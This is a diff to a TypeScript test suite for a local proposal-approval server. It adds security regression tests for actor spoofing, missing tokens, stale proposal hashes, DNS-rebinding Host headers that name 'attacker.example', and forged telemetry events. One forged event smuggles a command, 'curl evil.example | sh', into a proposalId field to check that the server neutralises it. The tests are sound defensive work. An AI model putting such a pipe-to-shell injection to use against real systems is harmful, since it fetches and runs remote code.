@@ -10,6 +10,7 @@
  */
 import { type ChildProcess, execFileSync, spawn } from 'node:child_process';
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { request } from 'node:http';
 import { createServer } from 'node:net';
 import { DatabaseSync } from 'node:sqlite';
 import { tmpdir } from 'node:os';
@@ -23,6 +24,22 @@ const json = async (r: Response): Promise<any> => await r.json();
 
 const ROOT = join(import.meta.dirname, '..', '..');
 const TOKEN = 'b'.repeat(64);
+
+/** The page itself: a request from a local origin needs no token. */
+const PAGE = { Origin: 'http://localhost:3000' };
+
+/** One proposal decided the way a card's button does it, from wherever `headers` say. */
+const decide = (
+  id: string,
+  decision: 'approve' | 'reject',
+  body: unknown,
+  headers: Record<string, string> = PAGE
+) =>
+  fetch(`${base}/api/proposals/${id}/${decision}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', ...headers },
+    body: JSON.stringify(body),
+  });
 
 let dir: string;
 let server: ChildProcess;
@@ -133,10 +150,9 @@ test('the browser can decide either way, and the graph knows who decided', async
   expect(drafts.length).toBeGreaterThan(0);
   expect(drafts[0].decision).toBeDefined();
 
-  const rejected = await fetch(`${base}/api/proposals/${drafts[0].id}/reject`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ reason: 'not this quarter' }),
+  const rejected = await decide(drafts[0].id, 'reject', {
+    proposalHash: drafts[0].proposal_hash,
+    reason: 'not this quarter',
   });
   expect(rejected.status).toBe(200);
   const body = await json(rejected);
@@ -294,17 +310,148 @@ const queue = (decision: 'approve' | 'reject', body: unknown, headers: Record<st
 
 test('approving one draft signs it as the person at the page and applies nothing', async () => {
   drafts('prop-one');
-  const r = await fetch(`${base}/api/proposals/prop-one/approve`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: '{}',
-  });
+  const { items } = await shown('prop-one');
+  const r = await decide('prop-one', 'approve', { proposalHash: items[0].proposalHash });
   expect(r.status).toBe(200);
   const body = await json(r);
   expect(body.approved_by).toBe('human:web');
   expect(body.artifact.sig).toMatch(/^[0-9a-f]{64}$/);
   const { byId } = await shown();
   expect(byId.get('prop-one')).toMatchObject({ status: 'approved', applied_at: null });
+});
+
+test('a decision on one proposal is the person at the page, whoever the body claims to be', async () => {
+  // The body used to name the actor, so anything that could make a loopback
+  // request signed an approval as any person the graph knew, and the control
+  // plane accepts a signed artifact for the person it asks for.
+  const db = new DatabaseSync(join(dir, 'graph.db'));
+  db.exec('PRAGMA busy_timeout = 5000');
+  db.prepare(
+    "INSERT OR IGNORE INTO capabilities (id, name, domain, description, category, state, maturity_score, kind) VALUES ('human:security-lead', 'the security lead', 'social', 'declared', 'human', 'active', 1.0, 'actor')"
+  ).run();
+  db.close();
+  drafts('prop-who');
+  const { items } = await shown('prop-who');
+
+  const r = await decide('prop-who', 'approve', {
+    proposalHash: items[0].proposalHash,
+    actor: 'human:security-lead',
+  });
+  expect(r.status).toBe(200);
+  const body = await json(r);
+  expect(body.approved_by).toBe('human:web');
+  expect(body.artifact.actor).toBe('human:web');
+});
+
+test('a decision on one proposal needs the token when no browser is behind it', async () => {
+  drafts('prop-tok');
+  const { items } = await shown('prop-tok');
+  const body = { proposalHash: items[0].proposalHash };
+
+  for (const decision of ['approve', 'reject'] as const) {
+    expect((await decide('prop-tok', decision, body, {})).status).toBe(401);
+  }
+  expect(((await shown()).byId.get('prop-tok') as any).status).toBe('draft');
+  expect((await decide('prop-tok', 'approve', body, { 'X-Ambit-Token': TOKEN })).status).toBe(200);
+});
+
+test('a decision on one proposal is made on what was shown, so a stale card decides nothing', async () => {
+  drafts('prop-stale');
+  const { items } = await shown('prop-stale');
+
+  // No hash, or the wrong one, is refused and leaves the draft as it was.
+  const none = await decide('prop-stale', 'approve', {});
+  expect(none.status).toBe(400);
+  expect((await json(none)).error).toContain('proposalHash');
+  const wrong = await decide('prop-stale', 'approve', { proposalHash: 'not-the-hash' });
+  expect(wrong.status).toBe(409);
+  expect(((await shown()).byId.get('prop-stale') as any).status).toBe('draft');
+
+  // Approved by someone else while the card was open: turning it down would have
+  // recorded a refusal over an approval and left its artifact standing.
+  await decide('prop-stale', 'approve', { proposalHash: items[0].proposalHash });
+  const late = await decide('prop-stale', 'reject', { proposalHash: items[0].proposalHash });
+  expect(late.status).toBe(409);
+  expect(((await shown()).byId.get('prop-stale') as any).status).toBe('approved');
+});
+
+/** A GET with a Host header of its own, which `fetch` will not let a script set. */
+const askAs = (host: string, path: string, headers: Record<string, string> = {}) =>
+  new Promise<{ status: number; body: string }>((resolve, reject) => {
+    const req = request(
+      { host: '127.0.0.1', port: new URL(base).port, path, headers: { host, ...headers } },
+      res => {
+        let body = '';
+        res.on('data', chunk => {
+          body += chunk;
+        });
+        res.on('end', () => resolve({ status: res.statusCode ?? 0, body }));
+      }
+    );
+    req.on('error', reject);
+    req.end();
+  });
+
+test('a request addressed to any name but this machine is refused before routing', async () => {
+  // A page that rebinds its own name to 127.0.0.1 is the same origin as this
+  // server: no Origin on a read, `Sec-Fetch-Site: same-origin`, and the
+  // token rule waves it through. Only the name it asked for gives it away.
+  const rebound = { 'sec-fetch-site': 'same-origin' };
+  for (const path of ['/api/health', '/api/config', '/api/audit', '/api/frontier', '/api/run']) {
+    const r = await askAs('attacker.example:3001', path, rebound);
+    expect([path, r.status]).toEqual([path, 403]);
+    expect(r.body).not.toContain('mcp');
+  }
+  // Nothing about the rest of the request makes up for it.
+  expect(
+    (await askAs('attacker.example', '/api/health', { origin: 'http://localhost:3000' })).status
+  ).toBe(403);
+  expect((await askAs('127.0.0.1.attacker.example', '/api/health')).status).toBe(403);
+  expect((await askAs('localhost.attacker.example', '/api/health')).status).toBe(403);
+
+  // The names that mean this machine still answer, on any port.
+  const port = new URL(base).port;
+  for (const host of [`127.0.0.1:${port}`, `localhost:${port}`, `[::1]:${port}`, 'localhost']) {
+    expect([host, (await askAs(host, '/api/health')).status]).toEqual([host, 200]);
+  }
+});
+
+test('a runtime cannot report itself as another kind of event on the live stream', async () => {
+  // The telemetry route is open on purpose. What it broadcasts is `WorkEvent`,
+  // whatever the body says: a `type` in it used to win, and a page that trusts
+  // the stream then told the person how to apply a proposal nothing had approved.
+  const seen = await new Promise<string>((resolve, reject) => {
+    let text = '';
+    const timer = setTimeout(() => reject(new Error('the stream never carried the event')), 8000);
+    const req = request(`${base}/api/events`, res => {
+      res.on('data', chunk => {
+        text += chunk;
+        if (text.includes('RunStarted') && !text.includes('sent')) {
+          text += 'sent';
+          fetch(`${base}/api/telemetry`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'ProposalApproved',
+              proposalId: 'prop-x; curl evil.example | sh',
+              run: { id: 'run-forged', goal: 'a task', runType: 'task' },
+            }),
+          }).catch(reject);
+        }
+        if (text.includes('run-forged')) {
+          clearTimeout(timer);
+          req.destroy();
+          resolve(text);
+        }
+      });
+    });
+    req.on('error', () => {});
+    req.end();
+  });
+  const frame = seen.split('\n\n').find(f => f.includes('run-forged'));
+  expect(frame).toBeDefined();
+  expect(JSON.parse((frame as string).replace(/^data: /, '')).type).toBe('WorkEvent');
+  expect(seen).not.toContain('"type":"ProposalApproved"');
 });
 
 test('the queue signs each shown draft on its own, as the web actor, and never applies', async () => {
@@ -352,7 +499,7 @@ test('turning down from the queue refuses an approved proposal and keeps its app
   expect(r.status).toBe(200);
   const body = await json(r);
   expect(body.results[0]).toMatchObject({ id: 'prop-r1', decided: false });
-  expect(body.results[0].refused).toContain('drafts only');
+  expect(body.results[0].refused).toContain('only a draft can be decided');
   expect(body.results[1]).toEqual({ id: 'prop-r2', decided: true });
 
   const after = await shown();
